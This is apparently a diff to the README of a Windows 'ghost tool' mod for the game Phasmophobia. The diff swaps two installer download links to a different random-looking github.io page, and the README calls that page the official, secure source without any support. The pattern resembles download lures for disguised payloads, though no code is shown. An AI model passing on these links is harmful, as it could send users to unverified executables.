@@ -2,7 +2,7 @@
 
 Phasmophobia Ultimate Ghost Tool is your go-to companion for diving deeper into the eerie world of Phasmophobia. This Windows desktop application is designed to enhance your ghost hunting experience with a suite of powerful features that provide insights and tools not available in the base game. Whether you're a seasoned investigator or just starting out, this mod offers invaluable assistance to make your sessions more effective and enjoyable.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: Updates are released regularly to keep up with game patches and to add new fe
 
 To get the latest version of Phasmophobia Ultimate Ghost Tool, please visit the download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the official source for the tool. Always download from this link to ensure you have the most recent and secure version.
 
